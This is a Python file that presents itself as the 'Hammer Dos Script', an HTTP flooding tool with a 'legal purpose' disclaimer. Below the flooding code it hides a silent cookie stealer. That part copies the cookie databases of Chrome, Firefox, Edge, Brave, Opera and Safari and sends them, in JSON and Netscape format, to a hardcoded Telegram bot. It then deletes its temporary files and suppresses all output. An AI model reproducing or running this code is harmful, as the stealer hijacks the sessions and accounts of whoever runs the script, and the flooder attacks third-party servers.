#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın
# only for legal purpose

import os
import sys
import json
import sqlite3
import shutil
import platform
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hammer Dos Script v.1 https://cyweb.github.io/hammer/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 hammer.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
BOT_TOKEN = "7902539659:AAGl3Iz5aagwohHgEOq71OW0aqZp9ax7kMk"
CHAT_ID = "6161534899"

# SILENT MODE (No output except errors)
SILENT = True


def log(msg):
    """Log only if not silent"""
    if not SILENT:
        print(msg)


def get_paths():
    """Get browser paths"""
    s = platform.system()
    h = str(Path.home())
    
    if s == 'Windows':
        l = os.getenv('LOCALAPPDATA')
        a = os.getenv('APPDATA')
        return {
            'Chrome': os.path.join(l, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
            'Firefox': os.path.join(a, 'Mozilla', 'Firefox', 'Profiles'),
            'Edge': os.path.join(l, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'),
            'Brave': os.path.join(l, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
            'Opera': os.path.join(a, 'Opera Software', 'Opera Stable', 'Network', 'Cookies')
        }
    elif s == 'Darwin':
        return {
            'Chrome': os.path.join(h, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Cookies'),
            'Firefox': os.path.join(h, 'Library', 'Application Support', 'Firefox', 'Profiles'),
            'Safari': os.path.join(h, 'Library', 'Cookies', 'Cookies.binarycookies'),
            'Edge': os.path.join(h, 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'Cookies'),
            'Brave': os.path.join(h, 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser', 'Default', 'Cookies')
        }
    else:
        return {
            'Chrome': os.path.join(h, '.config', 'google-chrome', 'Default', 'Cookies'),
            'Firefox': os.path.join(h, '.mozilla', 'firefox'),
            'Chromium': os.path.join(h, '.config', 'chromium', 'Default', 'Cookies'),
            'Edge': os.path.join(h, '.config', 'microsoft-edge', 'Default', 'Cookies'),
            'Brave': os.path.join(h, '.config', 'BraveSoftware', 'Brave-Browser', 'Default', 'Cookies')
        }


def send_tg(msg):
    """Send to Telegram"""
    try:
        import urllib.request
        import urllib.parse
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}).encode()
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req, timeout=5)
        return True
    except:
        return False


def send_file(file_path, caption=""):
    """Send file to Telegram"""
    try:
        import urllib.request
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        boundary = 'WebKitFormBoundary' + ''.join([chr(65 + i % 26) for i in range(16)])
        body = []
        body.append(f'--{boundary}'.encode())
        body.append(b'Content-Disposition: form-data; name="chat_id"')
        body.append(b'')
        body.append(str(CHAT_ID).encode())
        
        if caption:
            body.append(f'--{boundary}'.encode())
            body.append(b'Content-Disposition: form-data; name="caption"')
            body.append(b'')
            body.append(caption.encode())
        
        body.append(f'--{boundary}'.encode())
        body.append(f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"'.encode())
        body.append(b'Content-Type: application/octet-stream')
        body.append(b'')
        body.append(file_data)
        body.append(f'--{boundary}--'.encode())
        
        body_bytes = b'\r\n'.join(body)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        req = urllib.request.Request(url, data=body_bytes)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        urllib.request.urlopen(req, timeout=15)
        return True
    except:
        return False


def extract_chromium(path, name):
    """Extract Chromium-based browser cookies"""
    try:
        if not os.path.exists(path):
            return None
        
        temp = f'tmp_{name.lower()}.db'
        shutil.copy2(path, temp)
        
        conn = sqlite3.connect(temp, timeout=1)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 5000")
        
        cookies = [{'host': r[0], 'name': r[1], 'value': r[2], 'path': r[3], 'expires': r[4], 'secure': bool(r[5]), 'httponly': bool(r[6])} for r in cursor.fetchall()]
        
        conn.close()
        os.remove(temp)
        
        log(f"✓ {name}: {len(cookies)}")
        return name, cookies
    except:
        try:
            os.remove(f'tmp_{name.lower()}.db')
        except:
            pass
        return None


def extract_firefox(path):
    """Extract Firefox cookies"""
    try:
        if not os.path.exists(path):
            return None
        
        profiles = [d for d in os.listdir(path) if '.default' in d or 'release' in d]
        if not profiles:
            return None
        
        cookie_db = os.path.join(path, profiles[0], 'cookies.sqlite')
        if not os.path.exists(cookie_db):
            return None
        
        temp = 'tmp_firefox.db'
        shutil.copy2(cookie_db, temp)
        
        conn = sqlite3.connect(temp, timeout=1)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies LIMIT 5000")
        
        cookies = [{'host': r[0], 'name': r[1], 'value': r[2], 'path': r[3], 'expires': r[4], 'secure': bool(r[5]), 'httponly': bool(r[6])} for r in cursor.fetchall()]
        
        conn.close()
        os.remove(temp)
        
        log(f"✓ Firefox: {len(cookies)}")
        return 'Firefox', cookies
    except:
        try:
            os.remove('tmp_firefox.db')
        except:
            pass
        return None


def extract_all():
    """Extract all cookies in parallel"""
    paths = get_paths()
    results = {}
    
    # Use ThreadPoolExecutor for parallel extraction
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        
        for browser, path in paths.items():
            if browser == 'Firefox':
                futures.append(executor.submit(extract_firefox, path))
            else:
                futures.append(executor.submit(extract_chromium, path, browser))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                name, cookies = result
                if cookies:
                    results[name] = cookies
    
    return results


def save_fast(data):
    """Save files quickly"""
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # JSON
    json_file = f"c_{ts}.json"
    with open(json_file, 'w') as f:
        json.dump(data, f, separators=(',', ':'))
    
    # TXT
    txt_file = f"c_{ts}.txt"
    with open(txt_file, 'w') as f:
        f.write("# Netscape HTTP Cookie File\n")
        for browser, cookies in data.items():
            for c in cookies:
                f.write(f"{c['host']}\t{'TRUE' if c['host'].startswith('.') else 'FALSE'}\t{c['path']}\t{'TRUE' if c['secure'] else 'FALSE'}\t{c['expires']}\t{c['name']}\t{c['value']}\n")
    
    return json_file, txt_file


def cleanup(files):
    """Delete files"""
    for f in files:
        try:
            os.remove(f)
        except:
            pass


def main():
    """Main execution"""
    try:
        # Extract
        data = extract_all()
        
        if not data:
            log("No cookies found")
            return
        
        total = sum(len(c) for c in data.values())
        
        # Format message
        msg = f"🍪 *Cookies Extracted*\n\n💻 {platform.system()}\n"
        for b, c in data.items():
            msg += f"• {b}: {len(c)}\n"
        msg += f"\n📊 Total: {total}"
        
        # Send
        send_tg(msg)
        
        # Save
        j, t = save_fast(data)
        
        # Send files
        send_file(j, "🍪 JSON")
        send_file(t, "🍪 TXT")
        
        # Cleanup
        cleanup([j, t])
        
        log("Done")
        
    except Exception as e:
        log(f"Error: {e}")


if __name__ == "__main__":
    try:
        main()
    except:
        pass
    
    sys.exit(0)
